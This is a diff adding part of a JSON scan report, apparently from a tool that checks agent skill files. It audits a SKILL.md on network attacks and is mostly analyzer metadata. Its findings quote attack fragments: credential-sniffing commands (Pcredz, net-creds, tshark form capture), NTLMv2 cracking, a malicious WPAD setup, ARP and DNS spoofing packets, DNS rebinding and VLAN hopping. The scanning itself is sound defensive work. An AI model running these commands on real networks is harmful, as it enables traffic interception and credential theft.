+          "code_snippet": "\n```bash\npython3 Pcredz -f capture.pcap                                                    # from pcap\nsudo python2 net-creds.py -i eth0                                                 # real-time\ntshark -r capture.pcap -Y \"http.request.method == POST\" \\\n  -T fields -e http.host -e http.request.uri -e urlencoded-form.value             # HTTP POST\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 409,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 57,
+            "end_line": 57,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 80,
+            "end_line": 80,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 84,
+            "end_line": 84,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 139,
+            "end_line": 139,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 141,
+            "end_line": 141,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 142,
+            "end_line": 142,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 154,
+            "end_line": 154,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 180,
+            "end_line": 180,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 193,
+            "end_line": 193,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 225,
+            "end_line": 225,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 230,
+            "end_line": 230,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 260,
+            "end_line": 260,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 57,
+            "column": 17,
+            "evidence": "op=2, psrc=\"10.0.0.1\", hwsrc=\"aa:bb:cc:dd:ee:ff\", pdst=\"10.0.0.50\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 57,
+            "column": 61,
+            "evidence": "op=2, psrc=\"10.0.0.1\", hwsrc=\"aa:bb:cc:dd:ee:ff\", pdst=\"10.0.0.50\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 80,
+            "column": 44,
+            "evidence": "hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule # NTLMv2",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 84,
+            "column": 50,
+            "evidence": "WPAD is a high-value vector: browsers query for `wpad.dat` via DNS then LLMNR/NBT-NS. The `-w` flag makes Responder serve a malicious WPAD config that captures ",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 139,
+            "column": 19,
+            "evidence": "pkt = IP(dst=\"10.0.0.2\", src=\"8.8.8.8\") / \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 139,
+            "column": 35,
+            "evidence": "pkt = IP(dst=\"10.0.0.2\", src=\"8.8.8.8\") / \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 141,
+            "column": 52,
+            "evidence": "DNS(id=txid, qr=1, aa=1, qd=DNSQR(qname=\"intranet.corp.local\"),",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 142,
+            "column": 32,
+            "evidence": "an=DNSRR(rrname=\"intranet.corp.local\", rdata=\"10.0.0.99\", ttl=86400))",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 142,
+            "column": 61,
+            "evidence": "an=DNSRR(rrname=\"intranet.corp.local\", rdata=\"10.0.0.99\", ttl=86400))",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 154,
+            "column": 1,
+            "evidence": "./singularity -DNSRebindStrategy DNSRebindFromRequest \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 180,
+            "column": 41,
+            "evidence": "sslstrip+ rewrites domain names (e.g., `accounts.google.com` to `accountss.google.com`) so the browser never applies HSTS. dns2proxy resolves rewritten domains ",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 180,
+            "column": 66,
+            "evidence": "sslstrip+ rewrites domain names (e.g., `accounts.google.com` to `accountss.google.com`) so the browser never applies HSTS. dns2proxy resolves rewritten domains ",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 193,
+            "column": 28,
+            "evidence": "tshark -r capture.pcap -Y \"http.authbasic\" -T fields -e http.authbasic",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 225,
+            "column": 49,
+            "evidence": "Dot1Q(vlan=1) / Dot1Q(vlan=100) / IP(dst=\"10.100.0.50\") / ICMP()",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 230,
+            "column": 21,
+            "evidence": "ARP(op=2, psrc=\"10.100.0.1\", hwsrc=\"aa:bb:cc:dd:ee:ff\", pdst=\"10.100.0.50\")",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 230,
+            "column": 67,
+            "evidence": "ARP(op=2, psrc=\"10.100.0.1\", hwsrc=\"aa:bb:cc:dd:ee:ff\", pdst=\"10.100.0.50\")",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 260,
+            "column": 61,
+            "evidence": "pkt = Ether(src=mac, dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"0.0.0.0\", dst=\"255.255.255.255\") / \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 260,
+            "column": 76,
+            "evidence": "pkt = Ether(src=mac, dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"0.0.0.0\", dst=\"255.255.255.255\") / \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 45,
+        "findings_after_filtering": 45,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    }
+  ]
+}
